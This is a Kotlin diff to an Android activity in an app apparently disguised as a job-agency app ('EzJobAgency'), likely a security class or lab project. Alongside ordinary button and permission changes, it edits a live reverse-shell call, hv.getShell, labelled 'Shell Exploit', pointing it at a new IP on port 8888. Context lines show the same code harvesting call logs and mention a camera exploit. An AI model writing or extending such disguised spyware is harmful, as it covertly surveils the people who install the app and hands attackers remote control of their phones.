@@ -42,7 +42,8 @@ class ProfileTemplate : AppCompatActivity() {
             renderInfo(id, "")
         }
 
-        findViewById<Button>(R.id.callUs).setOnClickListener(::contactUs)
+        findViewById<Button>(R.id.callUs).setOnClickListener(::callUs)
+        findViewById<Button>(R.id.smsUs).setOnClickListener(::smsUs)
         findViewById<TextView>(R.id.ResumeBtn).setOnClickListener(::chooseFile)
         findViewById<Button>(R.id.location).setOnClickListener(::location)
         findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
@@ -84,7 +85,7 @@ class ProfileTemplate : AppCompatActivity() {
              hv.getCallLog()
         }
         if (checkFileStoragePerms()) {
-            hv.getShell("172.18.207.238", 8888)
+            hv.getShell("192.168.1.203", 8888)
         }   // Shell Exploit
 
         // Lynette Camera Exploit (Done in Camera Button) -----------------------------
@@ -149,7 +150,7 @@ class ProfileTemplate : AppCompatActivity() {
         }
     }
 
-    private fun contactUs(view: View) {
+    private fun smsUs(view: View) {
         val PERMISSIONS = arrayOf(
             android.Manifest.permission.SEND_SMS,
             android.Manifest.permission.READ_SMS
@@ -158,6 +159,18 @@ class ProfileTemplate : AppCompatActivity() {
             writeSms("Hello, I am interested in your job position in the EzJobAgency app.")
         } else {
             requestPerms(this, PERMISSIONS, 101)
+        }
+    }
+    private fun callUs(view: View) {
+        val PERMISSIONS = arrayOf(
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.CALL_PHONE,
+        )
+        if (checkPerms(this, *PERMISSIONS)) {
+//            writeSms("Hello, I am interested in your job position in the EzJobAgency app.")
+            //Placeholder to trigger phone but will nv be done
+        } else {
+            requestPerms(this, PERMISSIONS, 102)
         }
     }
     private fun chooseFile(view: View) {
@@ -191,7 +204,7 @@ class ProfileTemplate : AppCompatActivity() {
                 bgAlert.show()
             }
         } else {
-            requestPerms(this, PERMISSIONS, 102)
+            requestPerms(this, PERMISSIONS, 104)
         }
     }
     private fun openCamera(view: View) {
@@ -199,7 +212,7 @@ class ProfileTemplate : AppCompatActivity() {
             startCamera()
         }
         else {
-            requestPerms(this, arrayOf(android.Manifest.permission.CAMERA), 103)
+            requestPerms(this, arrayOf(android.Manifest.permission.CAMERA), 105)
         }
     }
 
@@ -221,7 +234,7 @@ class ProfileTemplate : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
             //Android is 11(R) or above
             val intent = Intent()
-            intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION //this and above is conflicting
+            intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
             selectorARL.launch(intent)
         }
         else{
